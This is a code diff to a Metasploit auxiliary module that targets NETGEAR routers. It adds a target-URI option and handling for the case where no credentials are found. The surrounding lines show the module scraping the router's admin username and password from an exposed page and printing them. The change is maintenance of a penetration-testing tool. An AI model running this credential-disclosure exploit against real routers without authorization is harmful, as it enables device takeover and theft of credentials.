@@ -39,7 +39,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
     [
       OptPort::new('RPORT', [true, 'The port to connect to RHOST with', 80]),
-      OptString::new('RHOST', [true, 'The router target ip address', nil])
+      OptString::new('RHOST', [true, 'The router target ip address', nil]),
+      OptString::new('TARGETURI', [true, 'The base path to the vulnerable application', '/'])
     ], self.class)
   end
 
@@ -50,6 +51,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     rhost = datastore['RHOST']
+    uri = target_uri.path
+    uri = normalize_uri(uri)
     print_status("Checking if #{rhost} is a NETGEAR router")
     vprint_status("Sending request to http://#{rhost}/")
 
@@ -73,7 +76,11 @@ class MetasploitModule < Msf::Auxiliary
       if r.to_s.include?('left">')
         username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
         password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td><td class=\"MNUText\" align=\"left\">", "</td>")
-        print_good("Creds found: #{username}/#{password}")
+        if username == "" || password == ""
+          print_error("No Creds found")
+        else
+          print_good("Creds found: #{username}/#{password}")
+        end
       else
         print_error("#{rhost} is not vulnerable because password recovery is on.")
       end
